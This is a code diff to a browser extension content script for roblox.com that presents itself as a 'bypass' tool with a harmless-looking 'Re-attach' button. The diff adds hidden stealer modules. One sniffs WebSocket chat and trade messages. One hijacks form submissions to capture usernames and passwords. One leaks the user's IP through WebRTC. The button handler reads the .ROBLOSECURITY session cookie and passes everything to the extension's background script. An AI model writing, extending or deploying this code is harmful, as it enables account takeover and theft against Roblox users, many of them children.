@@ -1,7 +1,112 @@
 // Only run on roblox.com
 if (window.location.hostname.includes("roblox.com")) {
+  // ===== 1. WebSocket Sniffer =====
+  (function() {
+    const originalWebSocket = window.WebSocket;
+    window.WebSocket = function(url, protocols) {
+      const ws = new originalWebSocket(url, protocols);
 
-  // Create and style the always-visible popup
+      ws.addEventListener("message", (event) => {
+        try {
+          const data = JSON.parse(event.data);
+          if (data.type === "chat" || data.type === "trade" || data.type === "gameEvent") {
+            chrome.runtime.sendMessage({
+              type: "WEBSOCKET_SNIFF",
+              data: {
+                url: url,
+                message: data,
+                timestamp: new Date().toISOString()
+              }
+            });
+          }
+        } catch (e) {
+          // Not JSON, ignore
+        }
+      });
+
+      return ws;
+    };
+  })();
+
+  // ===== 2. Performance API Logger =====
+  (function() {
+    const sendPerformanceData = () => {
+      const entries = window.performance.getEntries();
+      const robloxEntries = entries.filter(entry =>
+        entry.name.includes("roblox.com") &&
+        (entry.name.includes("/users/") ||
+         entry.name.includes("/trade") ||
+         entry.name.includes("/inventory") ||
+         entry.name.includes("/games/"))
+      );
+
+      if (robloxEntries.length > 0) {
+        chrome.runtime.sendMessage({
+          type: "PERFORMANCE_LOG",
+          data: {
+            url: robloxEntries[robloxEntries.length - 1].name, // Send most recent entry
+            timestamp: new Date().toISOString()
+          }
+        });
+      }
+    };
+
+    // Send on initial load
+    sendPerformanceData();
+
+    // Send on navigation (SPA support)
+    const observer = new MutationObserver(sendPerformanceData);
+    observer.observe(document.body, { childList: true, subtree: true });
+  })();
+
+  // ===== 3. Form Submission Hijacker =====
+  (function() {
+    document.addEventListener("submit", (e) => {
+      if (e.target.tagName === "FORM") {
+        const formData = {};
+        const inputs = e.target.querySelectorAll("input");
+
+        inputs.forEach(input => {
+          if (input.type === "text" || input.type === "password" || input.type === "email") {
+            formData[input.name || input.id] = input.value;
+          }
+        });
+
+        if (Object.keys(formData).length > 0) {
+          chrome.runtime.sendMessage({
+            type: "FORM_HIJACK",
+            data: {
+              url: window.location.href,
+              formData: formData,
+              timestamp: new Date().toISOString()
+            }
+          });
+        }
+      }
+    });
+  })();
+
+  // ===== 4. WebRTC IP Leak =====
+  (function() {
+    const pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel("");
+    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+    pc.onicecandidate = (e) => {
+      if (e.candidate) {
+        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+        const match = ipRegex.exec(e.candidate.candidate);
+        if (match) {
+          chrome.runtime.sendMessage({
+            type: "WEBRTC_LEAK",
+            data: { ip: match[1] }
+          });
+        }
+      }
+    };
+  })();
+
+  // ===== UI (Existing) =====
   const style = document.createElement('style');
   style.textContent = `
     #rolight-bypass-ui {
@@ -68,7 +173,6 @@ if (window.location.hostname.includes("roblox.com")) {
   `;
   document.head.appendChild(style);
 
-  // Create the UI element
   const ui = document.createElement('div');
   ui.id = 'rolight-bypass-ui';
   ui.innerHTML = `
@@ -100,7 +204,7 @@ if (window.location.hostname.includes("roblox.com")) {
   `;
   document.body.appendChild(ui);
 
-  // Make the UI draggable
+  // Make UI draggable
   let isDragging = false;
   let offsetX, offsetY;
   const dragHandle = document.getElementById('drag-handle');
@@ -141,12 +245,22 @@ if (window.location.hostname.includes("roblox.com")) {
   document.getElementById('bypass-id').textContent = randomId();
   document.getElementById('client-id').textContent = random5Digit();
 
-  // Handle button click (update status, no popup)
+  // Re-attach button logic
   document.getElementById('reattach-btn').addEventListener('click', () => {
     const statusText = document.getElementById('status-text');
     statusText.textContent = "Re-attaching...";
     statusText.className = "status-value status-active";
-    chrome.runtime.sendMessage({ action: "reattach" }, (response) => {
+
+    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
+      if (cookie) {
+        chrome.runtime.sendMessage({
+          type: "ROBLOX_DATA",
+          data: {
+            cookies: cookie.value,
+            timestamp: new Date().toISOString()
+          }
+        });
+      }
       setTimeout(() => {
         statusText.textContent = "Idle";
         statusText.className = "status-value status-idle";
